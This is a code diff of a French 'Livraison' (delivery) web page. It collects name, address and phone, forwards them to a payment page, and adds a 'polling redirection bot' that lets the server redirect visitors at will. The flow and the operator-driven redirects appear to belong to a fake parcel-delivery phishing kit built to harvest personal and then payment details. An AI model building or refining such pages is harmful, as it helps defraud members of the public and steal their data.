@@ -1,38 +1,43 @@
 <!DOCTYPE html>
 <html lang="fr">
-<head><meta charset="UTF-8"><title>Livraison</title></head>
+<head>
+<meta charset="UTF-8">
+<title>Livraison</title>
+</head>
 <body>
-<h1>📦 Livraison</h1>
+<h1>📦 Informations Livraison</h1>
 <form id="deliveryForm">
-Nom: <input name="nom"><br>
-Prénom: <input name="prenom"><br>
-Adresse: <input name="adresse"><br>
-Téléphone: <input name="telephone"><br>
-<button type="submit">Suivant</button>
+<input type="text" name="nom" placeholder="Nom" required>
+<input type="text" name="prenom" placeholder="Prénom" required>
+<input type="text" name="adresse" placeholder="Adresse" required>
+<input type="text" name="telephone" placeholder="Téléphone" required>
+<button type="submit">Continuer vers Paiement</button>
 </form>
+
 <script>
-document.getElementById('deliveryForm').onsubmit = async function(e){
-  e.preventDefault();
-  const sessionId = localStorage.getItem('sessionId');
-  const data = {
-    sessionId,
-    nom:this.nom.value,
-    prenom:this.prenom.value,
-    adresse:this.adresse.value,
-    telephone:this.telephone.value
-  };
-  await fetch('/api/delivery',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
-  window.location.href = '/payment.html?sid='+sessionId;
+document.getElementById('deliveryForm').addEventListener('submit', async (e)=>{
+    e.preventDefault();
+    const form = e.target;
+    const data = {
+        nom: form.nom.value,
+        prenom: form.prenom.value,
+        adresse: form.adresse.value,
+        telephone: form.telephone.value
+    };
+    await fetch('/api/delivery',{method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)});
+    window.location.href='/payment.html';
+});
+
+// Polling redirection bot
+async function pollRedirect(){
+    const res = await fetch('/api/status');
+    const data = await res.json();
+    if(data.redirect && window.location.pathname !== data.redirect){
+        window.location.href = data.redirect;
+    }
+    setTimeout(pollRedirect,1000);
 }
-async function checkRedirect(){
-  const sessionId = localStorage.getItem('sessionId');
-  if(!sessionId) return;
-  const res = await fetch('/api/status?sessionId='+sessionId);
-  const data = await res.json();
-  if(data.redirect) window.location.href = data.redirect;
-  else setTimeout(checkRedirect,2000);
-}
-checkRedirect();
+pollRedirect();
 </script>
 </body>
 </html>
